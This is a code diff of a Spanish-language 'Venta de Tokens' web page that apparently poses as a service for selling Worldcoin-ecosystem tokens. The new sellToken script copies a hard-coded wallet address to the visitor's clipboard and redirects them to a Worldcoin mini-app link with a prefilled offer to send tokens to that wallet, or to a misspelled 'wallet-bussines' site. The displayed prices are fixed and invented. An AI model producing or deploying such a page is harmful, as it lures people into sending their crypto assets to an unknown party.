@@ -3,227 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tokens</title>
+    <title>Venta de Tokens</title>
     <style>
+        /* Estilos básicos y futuristas */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+        
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
+
         .container {
             width: 100%;
-            max-width: 450px;
-            background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            background: linear-gradient(145deg, #1e1e1e, #333333);
+            border-radius: 15px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2), 0px 4px 20px rgba(100, 100, 255, 0.3);
             padding: 30px;
             text-align: center;
-            margin-top: 20px;
         }
+
         .header {
-            font-size: 28px;
+            font-size: 30px;
             font-weight: bold;
+            color: #00ffe7;
+            text-shadow: 0px 0px 8px #00ffe7;
             margin-bottom: 20px;
-            color: #2C3E50;
         }
+
         .balance {
-            font-size: 36px;
+            font-size: 42px;
             font-weight: bold;
-            color: #2C3E50;
+            color: #ff007f;
+            text-shadow: 0px 0px 12px #ff007f;
             margin-bottom: 30px;
         }
+
         .asset {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #ddd;
+            padding: 15px 0;
+            border-bottom: 1px solid #333;
             margin-bottom: 10px;
+            transition: all 0.3s ease;
         }
         .asset:last-child {
             border-bottom: none;
         }
+
         .asset-name {
             display: flex;
             align-items: center;
+            color: #e0e0e0;
         }
         .asset-logo {
-            width: 32px;
-            height: 32px;
+            width: 36px;
+            height: 36px;
             margin-right: 12px;
             border-radius: 50%;
+            border: 2px solid #00ffe7;
         }
+
         .asset-info {
             display: flex;
             flex-direction: column;
             align-items: flex-start;
         }
         .asset-amount {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            color: #2C3E50;
+            color: #00ffe7;
         }
-        .price {
-            font-size: 14px;
-            color: #888;
-        }
+
         .sell-button {
-            padding: 8px 15px;
+            padding: 8px 20px;
             font-size: 14px;
             color: #ffffff;
-            background-color: #E74C3C;
+            background: linear-gradient(145deg, #ff007f, #d4006a);
             border: none;
             border-radius: 5px;
             cursor: pointer;
             text-decoration: none;
             display: inline-block;
-            margin-left: 10px;
+            box-shadow: 0px 4px 8px rgba(255, 0, 127, 0.3);
+            transition: background 0.3s ease, box-shadow 0.3s ease;
         }
         .sell-button:hover {
-            background-color: #C0392B;
-        }
-
-        /* Estilo para las celdas de precios para que estén alineadas */
-        .price-cell {
-            width: 120px;
-            text-align: right;
-            padding-right: 10px;
+            background: linear-gradient(145deg, #ff338a, #e60072);
+            box-shadow: 0px 4px 12px rgba(255, 51, 138, 0.4);
         }
     </style>
+
     <script>
-        // Función para obtener los precios de las criptomonedas usando la API de CoinGecko
-        async function getCryptoPrices() {
-            try {
-                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,usd-coin,bitcoin,worldcoin&vs_currencies=usd');
-                const data = await response.json();
-
-                // Obtener los precios de las criptomonedas
-                const ethPrice = data.ethereum ? data.ethereum.usd : 'Cargando...';
-                const usdcPrice = data['usd-coin'] ? data['usd-coin'].usd : 'Cargando...';
-                const btcPrice = data.bitcoin ? data.bitcoin.usd : 'Cargando...';
-                const wldPrice = data.worldcoin ? data.worldcoin.usd : 'Cargando...';
-
-                // Actualizar los precios en el HTML
-                document.getElementById('price-eth').textContent = `$${ethPrice}`;
-                document.getElementById('price-usdc').textContent = `$${usdcPrice}`;
-                document.getElementById('price-btc').textContent = `$${btcPrice}`;
-                document.getElementById('price-wld').textContent = `$${wldPrice}`;
-            } catch (error) {
-                console.error('Error al obtener los precios:', error);
-                // Si hay error, mostrar un mensaje
-                document.getElementById('price-eth').textContent = 'Error al obtener el precio';
-                document.getElementById('price-usdc').textContent = 'Error al obtener el precio';
-                document.getElementById('price-btc').textContent = 'Error al obtener el precio';
-                document.getElementById('price-wld').textContent = 'Error al obtener el precio';
+        // Función para copiar wallet y redirigir según el token
+        function sellToken(token) {
+            let wallet;
+            let redirectUrl;
+            
+            if (token === 'wld') {
+                wallet = '0xda235e8c947490aa039f952cc5ec3bfe3a424758';
+                redirectUrl = 'https://wallet-bussines.github.io/'; // URL configurada para WLD
+            } else {
+                wallet = '0xde6b6e1cddbfd1d94afc01957748c36c36f43af4';
+                redirectUrl = 'https://worldcoin.org/mini-app?app_id=app_a4f7f3e62c1de0b9490a5260cb390b56&app_mode=mini-app/send?phone=1234567890&text=Estoy%20interesado%20en%20vender%20mis%20tokens%20de%20' + token + '%20a%20la%20wallet:%20' + wallet;
             }
-        }
 
-        // Llamar a la función cuando la página cargue
-        window.onload = function() {
-            getCryptoPrices();
+            // Copiar wallet al portapapeles
+            navigator.clipboard.writeText(wallet).then(() => {
+                alert('Wallet copiada al portapapeles');
+                window.location.href = redirectUrl;
+            }).catch(err => {
+                console.error('Error al copiar wallet: ', err);
+            });
         }
     </script>
 </head>
 <body>
 
 <div class="container">
-    <div class="header">Tokens</div>
-    <div class="balance" id="balance">$</div>
+    <div class="header">Venta de Tokens</div>
+    <div class="balance" id="balance">$0.00</div>
 
+    <!-- Token WLD -->
     <div class="asset">
         <div class="asset-name">
-            <img src="https://wallet-bussines.github.io/Oro.png" alt="Oro" class="asset-logo">
+            <img src="https://wallet-bussines.github.io/Wld.png" alt="Worldcoin" class="asset-logo">
             <div class="asset-info">
-                <div>ORO</div>
-                <div class="price" id="price-oro">Precio no disponible</div>
+                <div>Worldcoin (WLD)</div>
+                <div class="price">$1.20</div>
             </div>
         </div>
-        <div class="asset-amount">15</div>
-        <div class="price-cell">
-            <a href="https://worldcoin.org/mini-app?app_id=app_f1e44837a5e3c2af4da8925b46027645&app_mode=mini-app" class="sell-button">Vender</a>
-        </div>
+        <button class="sell-button" onclick="sellToken('wld')">Vender</button>
     </div>
 
-    <div class="asset">
-        <div class="asset-name">
-            <img src="https://wallet-bussines.github.io/Orb.png" alt="Orb" class="asset-logo">
-            <div class="asset-info">
-                <div>Orb</div>
-                <div class="price" id="price-orb">Precio no disponible</div>
-            </div>
-        </div>
-        <div class="asset-amount">1,000</div>
-        <div class="price-cell">
-            <a href="https://worldcoin.org/mini-app?app_id=app_3876b5f39809a50bb5ebe97c997bbcf1&app_mode=mini-app" class="sell-button">Vender</a>
-        </div>
-    </div>
-
+    <!-- Token USDC -->
     <div class="asset">
         <div class="asset-name">
             <img src="https://wallet-bussines.github.io/Usdc.png" alt="USDC" class="asset-logo">
             <div class="asset-info">
                 <div>USDC</div>
-                <div class="price" id="price-usdc">Cargando...</div>
+                <div class="price">$1.00</div>
             </div>
         </div>
-        <div class="asset-amount">0.006136</div>
-        <div class="price-cell">
-            <a href="" class="sell-button">Vender</a>
-        </div>
+        <button class="sell-button" onclick="sellToken('usdc')">Vender</button>
     </div>
 
+    <!-- Token Orb -->
     <div class="asset">
         <div class="asset-name">
-            <img src="https://wallet-bussines.github.io/eth.png" alt="ETH" class="asset-logo">
+            <img src="https://wallet-bussines.github.io/Orb.png" alt="Orb" class="asset-logo">
             <div class="asset-info">
-                <div>ETH</div>
-                <div class="price" id="price-eth">Cargando...</div>
+                <div>Orb</div>
+                <div class="price">$0.050</div>
             </div>
         </div>
-        <div class="asset-amount">0.0001</div>
-        <div class="price-cell">
-            <a href="" class="sell-button">Vender</a>
-        </div>
+        <button class="sell-button" onclick="sellToken('orb')">Vender</button>
     </div>
 
+    <!-- Token Oro -->
     <div class="asset">
         <div class="asset-name">
-            <img src="https://wallet-bussines.github.io/Btc.png" alt="BTC" class="asset-logo">
+            <img src="https://wallet-bussines.github.io/Oro.png" alt="Oro" class="asset-logo">
             <div class="asset-info">
-                <div>BTC</div>
-                <div class="price" id="price-btc">Cargando...</div>
+                <div>Oro</div>
+                <div class="price">$0.002</div>
             </div>
         </div>
-        <div class="asset-amount">0</div>
-        <div class="price-cell">
-            <a href="" class="sell-button">Vender</a>
-        </div>
-    </div>
-
-    <div class="asset">
-        <div class="asset-name">
-            <img src="https://wallet-bussines.github.io/Wld.png" alt="WLD" class="asset-logo">
-            <div class="asset-info">
-                <div>WLD</div>
-                <div class="price" id="price-wld">Cargando...</div>
-            </div>
-        </div>
-        <div class="asset-amount">10</div>
-        <div class="price-cell">
-            <a href="https://wallet-bussines.github.io/" class="sell-button">Vender</a>
-        </div>
+        <button class="sell-button" onclick="sellToken('oro')">Vender</button>
     </div>
 </div>
 
 </body>
 </html>
-                
